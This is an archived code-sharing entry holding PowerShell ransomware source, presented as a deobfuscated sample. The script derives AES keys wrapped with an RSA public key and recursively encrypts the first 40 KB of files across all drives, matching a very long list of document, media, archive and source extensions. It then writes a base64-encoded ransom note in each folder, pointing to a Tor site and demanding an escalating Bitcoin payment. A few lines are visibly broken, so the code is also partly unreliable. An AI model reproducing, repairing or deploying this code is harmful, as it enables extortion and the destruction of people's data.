---
Author: tojo2000
Publisher: 
Copyright: 
Email: 
Version: 0.1
Encoding: ascii
License: cc0
PoshCode ID: 5946
Published Date: 2017-07-28t08
Archived Date: 2017-02-05t12
---

# powershell crypto ransom - 

## Description

a deobfuscated version of http

## Comments



## Usage



## TODO



## 

``

## Code

`#
 #
 [Reflection.Assembly]::LoadWithPartialName('System.Security') | Out-Null
 
 $b64string1 = [System.Text.Encoding]::UTF8.GetString(
     [System.Convert]::FromBase64String("ThsjRsgdhTgsdgsdfThxjcGRgsfdtHmcjchdHmtpeHV2R2ZIdEh1amZScA==")
 	)
 [byte[]]$b64bytes1=[system.Text.Encoding]::Unicode.GetBytes($b64string1)
 
 $rsacrypto = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048)
 $rsacrypto.FromXmlString(
     "S2jGfstfhB765GtN+2+Ds/qfC8lfEp7u7jufJ6b2uyoOQcumI4OtrbBl6sdUeq+19MKB0iYdxdHAskKdRH6SRwOU4WOA2eplbd13XZQRAvJqwcF+2vPLRcl" +
 	"//QW6MfsBO/yBMHU+OQVuQpLRfgvtGhb2EN4VIOCl/lPSLrtAvvD17QVRD8KB4p8mujr87s9QeXojtL3nWfbQ0EnbFH+Oc0nRScC5IFcPjdsTBOt6cRYKTe" +
 	"PpmTc+ks5H5Oj1QBZnAQIQii9/KL0siG14VkqYwjJgwbKCmdEViZYT18QaeZ9JqrV9UkoU7nRK8ptlqTWy2ezQIOR+7tJjUnhWSuMITTlPi4AQaNEWBD3f3" +
 	"SISZFDmx/Rn0W3OmX59suix07VwmjWBgeh5qhFKL0sWI7g90anzwTGRKXxfxb+/rXBEfgA1aYep0WHOXPJbSIGoRiIPejSx/hHI7nljxqU6ktMe++GKV1hs" +
 	"7TCGCximT8nY3gkZDXFgbe1WoZSarqWRRGyFmS35R3RBoRLA3bhjN50DUTUvFUR+i9IKb0cHnA+8cuBzjgydJZC9Lmfep4f1DR2iMoxWHXBra2krO4Kn6d2" +
 	"gtEO3BYfKqerYU8A2/J1kEv9OYxzP7cd1ZbMIkA27JKgWqpVyhG6VkpyqDIihU9sqb2XdjYHSF8qI0U=AQAB"
     )
 $rsabase641=[system.Convert]::ToBase64String($rsacrypto.Encrypt($b64bytes1, $false)) 
 $staticstringbytes = [Text.Encoding]::UTF8.GetBytes("SgfmRshcTysjdjvRyshjcngdhDfgsjcO")
 
 $rijndaelcrypto = new-Object System.Security.Cryptography.RijndaelManaged
 $rijndaelcrypto.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes $b64string1, $staticstringbytes, 5).GetBytes(32) 
 $rijndaelcrypto.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes("RgmbjYhskdkRgcnvbhDsjzmchFjdsOsdf") )[0..15] 
 $rijndaelcrypto.Padding="Zeros"
 $rijndaelcrypto.Mode="CBC"
 
 $drives = gdr | where {$_.Free} | Sort-Object -Descending 
   foreach($drive in $drives){ 
     gci $drive.root -Recurse -Include ("*.doc","*.xls","*.docx","*.xlsx","*.mp3","*.waw","*.jpg","*.jpeg","*.txt","*.rtf","*.pdf",
                                        "*.rar","*.zip","*.psd","*.tif","*.wma","*.gif","*.bmp","*.ppt","*.pptx","*.docm","*.xlsm",
 									   "*.pps","*.ppsx","*.ppd","*.eps","*.png","*.ace","*.djvu","*.tar","*.cdr","*.max","*.wmv",
 									   "*.avi","*.wav","*.mp4","*.pdd","*.php","*.aac","*.ac3","*.amf","*.amr","*.dwg","*.dxf",
 									   "*.accdb","*.mod","*.tax2013","*.tax2014","*.oga","*.ogg","*.pbf","*.ra","*.raw","*.saf",
 									   "*.val","*.wave","*.wow","*.wpk","*.3g2","*.3gp","*.3gp2","*.3mm","*.amx","*.avs","*.bik",
 									   "*.dir","*.divx","*.dvx","*.evo","*.flv","*.qtq","*.tch","*.rts","*.rum","*.rv","*.scn",
 									   "*.srt","*.stx","*.svi","*.swf","*.trp","*.vdo","*.wm","*.wmd","*.wmmp","*.wmx","*.wvx",
 									   "*.xvid","*.3d","*.3d4","*.3df8","*.pbs","*.adi","*.ais","*.amu","*.arr","*.bmc","*.bmf",
 									   "*.cag","*.cam","*.dng","*.ink","*.jif","*.jiff","*.jpc","*.jpf","*.jpw","*.mag","*.mic",
 									   "*.mip","*.msp","*.nav","*.ncd","*.odc","*.odi","*.opf","*.qif","*.qtiq","*.srf","*.xwd",
 									   "*.abw","*.act","*.adt","*.aim","*.ans","*.asc","*.ase","*.bdp","*.bdr","*.bib","*.boc",
 									   "*.crd","*.diz","*.dot","*.dotm","*.dotx","*.dvi","*.dxe","*.mlx","*.err","*.euc","*.faq",
 									   "*.fdr","*.fds","*.gthr","*.idx","*.kwd","*.lp2","*.ltr","*.man","*.mbox","*.msg","*.nfo",
 									   "*.now","*.odm","*.oft","*.pwi","*.rng","*.rtx","*.run","*.ssa","*.text","*.unx","*.wbk",
 									   "*.wsh","*.7z","*.arc","*.ari","*.arj","*.car","*.cbr","*.cbz","*.gz","*.gzig","*.jgz",
 									   "*.pak","*.pcv","*.puz","*.r00","*.r01","*.r02","*.r03","*.rev","*.sdn","*.sen","*.sfs",
 									   "*.sfx","*.sh","*.shar","*.shr","*.sqx","*.tbz2","*.tg","*.tlz","*.vsi","*.wad","*.war",
 									   "*.xpi","*.z02","*.z04","*.zap","*.zipx","*.zoo","*.ipa","*.isu","*.jar","*.js","*.udf",
 									   "*.adr","*.ap","*.aro","*.asa","*.ascx","*.ashx","*.asmx","*.asp","*.indd","*.asr","*.qbb",
 									   "*.bml","*.cer","*.cms","*.crt","*.dap","*.htm","*.moz","*.svr","*.url","*.wdgt","*.abk",
 									   "*.bic","*.big","*.blp","*.bsp","*.cgf","*.chk","*.col","*.cty","*.dem","*.elf","*.ff",
 									   "*.gam","*.grf","*.h3m","*.h4r","*.iwd","*.ldb","*.lgp","*.lvl","*.map","*.md3","*.mdl",
 									   "*.mm6","*.mm7","*.mm8","*.nds","*.pbp","*.ppf","*.pwf","*.pxp","*.sad","*.sav","*.scm",
 									   "*.scx","*.sdt","*.spr","*.sud","*.uax","*.umx","*.unr","*.uop","*.usa","*.usx","*.ut2",
 									   "*.ut3","*.utc","*.utx","*.uvx","*.uxx","*.vmf","*.vtf","*.w3g","*.w3x","*.wtd","*.wtf",
 									   "*.ccd","*.cd","*.cso","*.disk","*.dmg","*.dvd","*.fcd","*.flp","*.img","*.iso","*.isz",
 									   "*.md0","*.md1","*.md2","*.mdf","*.mds","*.nrg","*.nri","*.vcd","*.vhd","*.snp","*.bkf",
 									   "*.ade","*.adpb","*.dic","*.cch","*.ctt","*.dal","*.ddc","*.ddcx","*.dex","*.dif","*.dii",
 									   "*.itdb","*.itl","*.kmz","*.lcd","*.lcf","*.mbx","*.mdn","*.odf","*.odp","*.ods","*.pab",
 									   "*.pkb","*.pkh","*.pot","*.potx","*.pptm","*.psa","*.qdf","*.qel","*.rgn","*.rrt","*.rsw",
 									   "*.rte","*.sdb","*.sdc","*.sds","*.sql","*.stt","*.t01","*.t03","*.t05","*.tcx","*.thmx",
 									   "*.txd","*.txf","*.upoi","*.vmt","*.wks","*.wmdb","*.xl","*.xlc","*.xlr","*.xlsb","*.xltx",
 									   "*.ltm","*.xlwx","*.mcd","*.cap","*.cc","*.cod","*.cp","*.cpp","*.cs","*.csi","*.dcp",
 									   "*.dcu","*.dev","*.dob","*.dox","*.dpk","*.dpl","*.dpr","*.dsk","*.dsp","*.eql","*.ex",
 									   "*.f90","*.fla","*.for","*.fpp","*.jav","*.java","*.lbi","*.owl","*.pl","*.plc","*.pli",
 									   "*.pm","*.res","*.rsrc","*.so","*.swd","*.tpu","*.tpx","*.tu","*.tur","*.vc","*.yab","*.8ba",
 									   "*.8bc","*.8be","*.8bf","*.8bi8","*.bi8","*.8bl","*.8bs","*.8bx","*.8by","*.8li","*.aip",
 									   "*.amxx","*.ape","*.api","*.mxp","*.oxt","*.qpx","*.qtr","*.xla","*.xlam","*.xll","*.xlv",
 									   "*.xpt","*.cfg","*.cwf","*.dbb","*.slt","*.bp2","*.bp3","*.bpl","*.clr","*.dbx","*.jc",
 									   "*.potm","*.ppsm","*.prc","*.prt","*.shw","*.std","*.ver","*.wpl","*.xlm","*.yps","*.md3",
 									   "*.1cd") |
     %{
       try{
         $binreader = New-Object System.IO.BinaryReader([System.IO.File]::Open($_, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII)
         if ($binreader.BaseStream.Length -lt 40712){ 
 		    $bytestoread = $binreader.BaseStream.Length
         }else{
           $bytestoread = 40712
         }
         $b64bytes1 = $binreader.ReadBytes($bytestoread)
         $binreader.Close()
 		  
         $encryptor = $rijndaelcrypto.CreateEncryptor()
 	    $memory_stream = new-Object IO.$memory_stream 
         
         $crypto_stream = new-Object Security.Cryptography.CryptoStream $memory_stream, $encryptor, "Write"
         $crypto_stream.Write($b64bytes1, 0, $b64bytes1.Length)
         $crypto_stream.Close()
         $memory_stream.Close()
         $encryptor.Clear()
         
         $mem_array = $memory_stream.ToArray() 
         $binary_writer = New-Object System.IO.BinaryWriter([System.IO.File]::Open($_, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII)
         
         $binary_writer.Close()
         
         $ransom_filename = $_.Directory.ToString() + '\DECRYPT_INSTRUCTION.html'
         $decode_b64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PHRpdGxlPllvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQhPC90aXRsZT48aDI+WW91ciBmaWxlcyB3ZXJlIGVuY3J5cHRlZCBhbmQgbG9ja2VkIHdpdGggYSBSU0EyMDQ4IGtleTwvaDI+PHA+VG8gZGVjcnlwdCB5b3VyIGZpbGVzOjxicj4gRG93bmxvYWQgdGhlIFRvciBicm93c2VyIDxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvcnByb2plY3Qub3JnL2Rvd25sb2FkL2Rvd25sb2FkLWVhc3kuaHRtbC5lbiI+aGVyZTwvYT4gYW5kIGdvIHRvIDxiPmh0dHA6Ly9ycTR1bDMycGgzNGoyZ2huLm9uaW9uPC9iPiB3aXRoaW4gdGhlIGJyb3dzZXIuPGJyPkZvbGxvdyB0aGUgaW5zdHJ1Y3Rpb25zIGFuZCB5b3Ugd2lsbCByZWNlaXZlIHRoZSBkZWNyeXB0ZXIgd2l0aGluIDEyIGhvdXJzLjxicj5Zb3UgaGF2ZSB0ZW4gZGF5cyB0byBvYnRhaW4gdGhlIGRlY3J5cHRlciBiZWZvcmUgdGhlIHByaWNlIHRvIG9idGFpbiB0aGUgZGVjcnlwdGVyIGlzIGRvdWJsZWQuIFNjaGVkdWxlZCBkZWxldGlvbiBvZiB0aGUgcHJpdmF0ZSBrZXkgZnJvbSBvdXIgc2VydmVyIGlzIGFmdGVyIDMwIGRheXMgLSBsZWF2aW5nIHlvdXIgZmlsZXMgaXJyZXZvY2FibHkgYnJva2VuLjxicj5Zb3VyIElEIGlzIDxiPlc3NEh4YzVGMTwvYj4="));
       
 		  if(!(Test-path($ransom_filename))){
           New-Item -Path $ransom_filename -ItemType file -Value $decode_b64 Add-Content -Path $ransom_filename -Value ('<p><b>Guaranteed recovery is provided before scheduled deletion of private key on the day of '+(Get-Date).AddDays(+30)) Add-Content -Path $ransom_filename -Value ('<p><b>The price to obtain the decrypter goes from 2BTC to 4BTC on the day of '+(Get-Date).AddDays(+10)) }}
           catch{
           }
         } 
       }
`

